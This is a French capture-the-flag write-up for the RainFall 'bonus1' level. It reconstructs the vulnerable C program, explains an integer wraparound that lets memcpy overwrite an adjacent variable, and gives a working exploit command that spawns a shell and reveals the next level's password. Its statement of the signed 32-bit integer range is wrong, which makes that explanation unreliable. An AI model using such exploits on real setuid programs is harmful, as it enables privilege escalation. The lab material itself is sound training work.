# Bonus1

pass : `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Source :

```c
#include <stdlib.h>
#include <string.h>

int		main(int ac, char **av) {  // 0x08048424
	char str[40];  // esp+0x14  --  size : 0x3c - 0x14
	int nb;  // esp+0x3c

	nb = atoi(av[1]);
	if (nb > 9) {
		return 1;
	}
	memcpy(str, av[2], 4 * nb);
	if (nb == 0x574f4c46) {
		execl("/bin/sh", "sh", 0);
	}
	return 0;
}
```

## Recherche :

> Ici, on va vouloir changer la valeur de `nb` avec le `memcpy()`, comme on le voit `str` et `nb` sont contingent, donc en écrivant suffisamment loin dans `str` on pourrait écrire sur `nb`. Suffisamment loin, c'est 40 caractères pour `str` et 4 autres pour écrire sur `nb`. Soit un total de `44` caractères.
>
> `nb` doit être remplacé par `0x574f4c46`.

Ce qu'on veut donc, c'est `memcpy(str, av[2], 4 * nb)`, avec `nb == 11`.
Le problème, c'est que `nb` ne peut pas dépasser `9`.

Mais c'est pas très grave, car les int sont circulaires, en effet quand on passe le plus grand int, on arrive au plus petit.

On est en **32bit**, du coup les int sont codés entre `0x00000000` et `0xffffffff`, ce qui fait `2^32 - 1` valeures possibles. Comme ils sont signé, c’est divisé par 2, le plus petit int, c’est `-(2^30 - 1)` et le plus grand `2^30`
Du coup `0 + InfMin - InfMax == 0`  soit  `0 + -(2^30 - 1) - 2^30  == 0`

```python
>>> -(2**30 - 1) - (2**30) + 11
-2147483636
```

## Exploit :

```shell
bonus1@RainFall:~$ ./bonus1 -2147483636 $(python -c 'print "A"*40+ "\x46\x4c\x4f\x57"')
$ whoami
bonus2
$ cd ../bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
